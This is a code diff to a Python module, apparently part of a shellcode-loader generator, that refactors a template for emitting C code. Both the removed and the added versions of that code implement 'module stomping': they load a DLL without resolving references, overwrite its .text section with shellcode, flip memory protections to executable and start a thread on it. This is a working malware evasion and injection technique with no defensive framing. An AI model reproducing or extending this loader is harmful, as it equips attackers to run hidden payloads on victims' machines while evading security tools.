@@ -1,4 +1,5 @@
 from string import Template
+from c.utils.functions import *
 
 class modulestomp:
     def __init__(self, arguments):
@@ -16,18 +17,15 @@ class modulestomp:
         return ''
 
     def template(self) -> str:
-        return Template("""
-    {transformers}
 
-    PBYTE dll  = (PBYTE){LoadLibraryExA}( "$target", NULL, DONT_RESOLVE_DLL_REFERENCES );
-    DWORD size = IMAGE_FIRST_SECTION( dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->SizeOfRawData;
-    PBYTE text = dll + IMAGE_FIRST_SECTION( dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->VirtualAddress;
+        template = '\n\t{transformers}'
+        template += LoadLibraryExA('dll', self.target, 'DONT_RESOLVE_DLL_REFERENCES')
+        template += '\n\tDWORD size = IMAGE_FIRST_SECTION( (PBYTE)dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->SizeOfRawData;'
+        template += '\n\tPBYTE text = (PBYTE)dll + IMAGE_FIRST_SECTION( (PBYTE)dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->VirtualAddress;'
+        template += VirtualProtect('text', '{shellcodeSize}', 'PAGE_READWRITE')
+        template += memcpy('text', 'shellcode', '{shellcodeSize}')
+        template += VirtualProtect('text', '{shellcodeSize}', 'PAGE_EXECUTE_READ')
+        template += CreateRemoteThread('hThread', '(HANDLE)-1', 'text')
+        template += WaitForSingleObject('hThread', 'INFINITE')
 
-    DWORD oldProt = 0;
-    {VirtualProtect}( text, {shellcodeSize}, PAGE_READWRITE, &oldProt );
-    memcpy( text, shellcode, {shellcodeSize} );
-    {VirtualProtect}( text, {shellcodeSize}, PAGE_EXECUTE_READ, &oldProt );
-
-    HANDLE hThread = {CreateRemoteThread}( ( HANDLE )-1, NULL, 0, (LPTHREAD_START_ROUTINE)text, NULL, 0, NULL );
-    {WaitForSingleObject}(hThread, INFINITE);
-""").substitute(target=self.target)
+        return template
